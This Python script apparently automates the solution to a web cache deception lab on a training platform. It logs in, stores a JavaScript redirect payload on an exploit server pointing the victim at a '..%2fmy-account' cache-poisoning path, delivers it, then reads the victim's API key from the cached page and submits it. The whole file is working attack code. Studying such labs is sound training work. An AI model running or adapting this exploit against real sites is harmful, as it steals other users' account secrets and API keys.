import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url +'/login'
cache_url = burp_url + '/resources/..%2fmy-account?aaaa'
acc_url = burp_url + '/my-account'
solution_url = burp_url + '/submitSolution'

session = requests.Session()


response = session.get(burp_url)
match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
exploit_server = match.group(0)

response = session.get(login_url)
match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = match.group(1)
burp_data = {"csrf": csrf,"username": "wiener", "password": "peter"}
session.post(login_url, data=burp_data)
session.get(acc_url)

burp_data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8", "responseBody": f"<script>document.location=\"{cache_url}\"</script>", "formAction": "STORE"}
session.post(exploit_server, data=burp_data)

session.get(exploit_server + '/deliver-to-victim')

response = session.get(cache_url)
match = re.search(r'Your API Key is: ([0-9a-zA-Z]{32})',response.text)
answer = match.group(1)
print(answer)
burp_data = {"answer": answer}
session.post(solution_url, data=burp_data)
